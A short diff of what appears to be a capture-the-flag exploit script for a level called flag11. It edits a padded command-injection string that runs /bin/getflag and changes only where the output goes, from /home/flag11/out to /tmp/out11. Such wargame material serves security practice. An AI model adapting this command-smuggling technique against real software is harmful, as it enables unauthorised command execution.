@@ -5,7 +5,7 @@ MAXINT=4294967296
 
 # command string to be obtained
 # first part can be any command
-cmd="/bin/getflag > /home/flag11/out; echo " + "A" * 1024
+cmd="/bin/getflag > /tmp/out11; echo " + "A" * 1024
 
 # build keys array
 key = [0 for i in range(0, len(cmd))]
